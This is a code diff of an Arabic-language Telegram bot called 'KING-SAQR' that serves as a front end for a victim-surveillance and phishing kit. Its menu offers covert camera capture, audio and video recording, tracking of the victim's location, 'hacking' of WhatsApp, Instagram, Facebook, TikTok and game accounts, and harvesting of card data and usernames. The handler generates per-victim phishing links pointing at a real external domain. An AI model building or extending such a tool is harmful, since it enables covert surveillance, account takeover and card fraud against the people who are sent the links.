+        const response = await fetch(url, { headers: { "X-API-Key": API_KEY_EXACT } });
+        const buffer = Buffer.from(await response.arrayBuffer());
+        if (quality === "audio") return bot.sendAudio(chatId, buffer, { filename: 'audio.mp3' });
+        return bot.sendVideo(chatId, buffer, { filename: `video.mp4` });
+    } catch (e) { return bot.sendMessage(chatId, "❌ فشل التحميل."); }
+}
+
+// NEW UNIFIED HANDLERS
+bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    // ... Copy original start logic but simplified for now ...
+    const mainMenuButtons = [
+        [{ text: '📸 كاميرا أمامية', callback_data: `feat_cam_front`, style: 'danger' }, { text: '📷 كاميرا خلفية', callback_data: `feat_cam_back`, style: 'danger' }],
+        [{ text: '🎤 تسجيل صوت', callback_data: `feat_record`, style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: `feat_video`, style: 'danger' }],
+        [{ text: '📍 موقع الضحية', callback_data: `feat_location`, style: 'danger' }, { text: '📡 كاميرات مراقبة', callback_data: 'feat_cameras', style: 'primary' }],
+        [{ text: '🟢 واتساب', callback_data: 'feat_wa_hack', style: 'success' }, { text: '🖥️ انستجرام', callback_data: `feat_ig_hack`, style: 'primary' }],
+        [{ text: '🔮 فيسبوك', callback_data: `feat_fb_hack`, style: 'primary' }, { text: '📳 تيك توك', callback_data: `feat_tt_hack`, style: 'primary' }],
+        [{ text: '🕹️ ببجي', callback_data: 'feat_pubg_hack', style: 'primary' }, { text: '👾 فري فاير', callback_data: 'feat_ff_hack', style: 'primary' }],
+        [{ text: "💳 صيد فيزات", callback_data: "feat_visa", style: 'success' }, { text: '🪝 صيد يوزرات', callback_data: 'feat_users', style: 'success' }],
+        [{ text: '🧠 الذكاء الاصطناعي', callback_data: 'feat_ai', style: 'primary' }, { text: "🧞‍♂️ لعبة المارد", callback_data: 'play', style: 'primary' }],
+        [{ text: '📩 تحميل فيديوهات', callback_data: 'feat_social_down', style: 'primary' }, { text: '👨‍🎓 المطور', url: 'https://t.me/HackWahm' }]
+    ];
+    bot.sendMessage(chatId, 'مرحباً بك في بوت KING-SAQR المتطور!👋', { reply_markup: { inline_keyboard: mainMenuButtons } });
 });
 
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const action = query.data;
-    if (action.startsWith('manus_dl_')) {
-        const quality = action.replace('manus_dl_', '');
-        const m = await bot.sendMessage(chatId, "⏳ جارِ الاتصال بالسيرفر وتحميل الفيديو...");
-        return handleUserVideoDownloadManus(chatId, quality, m.message_id);
+    await bot.answerCallbackQuery(query.id).catch(() => {});
+
+    if (action === 'play') {
+        try {
+            const { signature, session } = await extractSignatureAndSessionFixed();
+            userSessionss[chatId] = { signature, session, data: resetGame(signature, session) };
+            return askQuestionFixed(query.message, chatId, true);
+        } catch (e) { return bot.sendMessage(chatId, `⚠️ خطأ في الجلسة: ${e.message}`); }
     }
-    if (action === 'feat_social_down') {
-        userStatesManusV23[chatId] = 'wait_down';
-        return bot.sendMessage(chatId, '📩 أرسل رابط الفيديو (تيك توك، يوتيوب، انستقرام، إلخ) للتحميل الفوري:');
+    if (action.startsWith('answer_')) {
+        if (!userSessionss[chatId]) return bot.sendMessage(chatId, "يرجى بدء اللعبة أولاً.");
+        userSessionss[chatId].data.answer = action.split('_')[1];
+        return askQuestionFixed(query.message, chatId);
     }
-    if (action === 'feat_shorten_real') {
-        userStatesManusV23[chatId] = 'wait_short';
-        return bot.sendMessage(chatId, '🔗 أرسل الرابط المراد اختصاره:');
-    }
-    if (action.includes('_hack')) {
+    if (action.startsWith('manus_dl_')) return handleVideoDownloadManus(chatId, action.replace('manus_dl_', ''), query.message.message_id);
+    if (action === 'feat_social_down') { userStatesManusV26[chatId] = 'wait_down'; return bot.sendMessage(chatId, '📩 أرسل رابط الفيديو للتحميل الفوري:'); }
+
+    const domain = "https://apiwahm.onrender.com"; // Your actual domain
+    if (action.endsWith('_hack')) {
         const platform = action.split('_')[1];
-        return bot.sendMessage(chatId, `🔥 تم توليد رابط الاختراق بنجاح!\n\n🔗 الرابط:\nhttps://domin.com/${platform}?id=${chatId}`);
+        return bot.sendMessage(chatId, `🔥 رابط اختراق ${platform}:\n${domain}/${platform}?id=${chatId}`);
+    }
+});
+
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
+    if (!text || text.startsWith('/')) return;
+    if (userStatesManusV26[chatId]) {
+        const state = userStatesManusV26[chatId];
+        delete userStatesManusV26[chatId];
+        if (state === 'wait_down') return handleVideoInfoManus(chatId, text);
     }
 });
